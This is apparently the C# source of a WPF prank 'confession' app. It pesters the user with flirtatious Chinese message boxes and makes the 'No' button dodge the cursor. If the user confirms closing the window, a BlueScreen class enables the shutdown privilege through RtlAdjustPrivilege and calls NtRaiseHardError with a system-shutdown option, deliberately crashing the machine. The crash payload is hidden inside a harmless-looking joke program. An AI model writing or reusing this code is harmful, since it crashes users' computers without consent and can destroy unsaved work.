using System;
using System.Runtime.InteropServices;
using System.Timers;
using System.Windows;
using System.Windows.Input;
using NTSTATUS = System.UInt32;

namespace ChaseTheSkirt
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        int noCount = 0;
        bool End = false;
        Timer timer;
        public MainWindow()
        {
            InitializeComponent();
            timer = new Timer()
            {
                AutoReset = true,
                Interval = 3000,
            };
            timer.Elapsed += Timer_Elapsed;
        }
        private void Timer_Init()
        {
            if (timer != null)
            {
                timer.Elapsed -= Timer_Elapsed;
                timer.Dispose();
            }
            timer = new Timer()
            {
                AutoReset = true,
                Interval = 3000,
            };
            timer.Elapsed += Timer_Elapsed;
            timer.Start();
        }
        private void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            NoButton.Dispatcher.Invoke(
                new Action(
                    delegate
                    {
                        NoButton.Visibility = Visibility.Visible;
                    }
                )
            );
            DodgeNoButton.Dispatcher.Invoke(
                new Action(
                    delegate
                    {
                        DodgeNoButton.Visibility = Visibility.Collapsed;
                    }
                )
            );
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (End)
            {
                return;
            }
            MessageBoxResult messageBoxResult;
            messageBoxResult = MessageBox.Show("真的要拒绝吗                  ", "( >﹏<。)～ ", MessageBoxButton.OKCancel);
            if (MessageBoxResult.OK == messageBoxResult)
            {
                MessageBox.Show("再见~                  ", ":(");
                new BlueScreen();
            }
            else
            {
                e.Cancel = true;
            }
        }

        private void YesButton_Click(object sender, RoutedEventArgs e)
        {
            if (0 == noCount)
            {
                MessageBox.Show("我就知道你也喜欢我！                  ", "哈哈哈哈");
            }
            else
            {
                MessageBox.Show("轻松拿下！                            ", "哈哈哈哈");
            }
            End = true;
            Close();
        }

        private void NoButton_Click(object sender, RoutedEventArgs e)
        {
            switch (noCount % 6)
            {
                case 0:
                    MessageBox.Show("房子写你名！                                        \n\n", "我喜欢你");
                    break;
                case 1:
                    MessageBox.Show("保大！                                              \n\n", "喜欢你很久了");
                    break;
                case 2:
                    MessageBox.Show("我妈会游泳                                          \n\n", "爱我");
                    break;
                case 3:
                    MessageBox.Show("你再考虑考虑                                        \n\n", "你忍心吗？");
                    break;
                case 4:
                    MessageBox.Show("你确定不后悔？                                      \n\n", "我很帅的！");
                    break;
                case 5:
                    MessageBox.Show("你来抓我啊！                                        \n\n", "哈哈哈哈哈哈！");
                    NoButton.Visibility = Visibility.Collapsed;
                    DodgeNoButton.Visibility = Visibility.Visible;
                    timer.Start();
                    break;
                default:
                    break;
            }
            noCount++;
        }


        private void DodgeNoButton_MouseEnter(object sender, MouseEventArgs e)
        {
            Random random = new Random(Convert.ToInt32(DateTime.UtcNow.Ticks % int.MaxValue));
            double left = random.NextDouble() * (MainGrid.ActualWidth - DodgeNoButton.ActualWidth);
            double top = random.NextDouble() * (MainGrid.ActualHeight - DodgeNoButton.ActualHeight);
            DodgeNoButton.Margin = new Thickness(left, top, 0, 0);
            Timer_Init();
        }
    }
    public class BlueScreen
    {
        enum HarderrorResponseOption
        {
            OptionAbortRetryIgnore,
            OptionOk,
            OptionOkCancel,
            OptionRetryCancel,
            OptionYesNo,
            OptionYesNoCancel,
            OptionShutdownSystem
        };

        enum HarderrorResponse
        {
            ResponseReturnToCaller,
            ResponseNotHandled,
            ResponseAbort,
            ResponseCancel,
            ResponseIgnore,
            ResponseNo,
            ResponseOk,
            ResponseRetry,
            ResponseYes
        };
        const int SE_SHUTDOWN_PRIVILEGE = 19;
        const int SE_DEBUG_PRIVILEGE = 20;

        [DllImport("ntdll", EntryPoint = "RtlAdjustPrivilege")]
        extern static uint AdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
        [DllImport("ntdll", EntryPoint = "NtRaiseHardError")]
        extern static uint RaiseHardError(
            NTSTATUS status,
            uint n,
            out string str,
            IntPtr intPtr,
            HarderrorResponseOption harderrorResponseOption,
            out HarderrorResponse harderrorResponse);
        public BlueScreen()
        {
            AdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, true, false, out var p);
            RaiseHardError(0xc0000000, 0, out var str, new IntPtr(0), HarderrorResponseOption.OptionShutdownSystem, out var harderrorResponse);
        }
    }
}
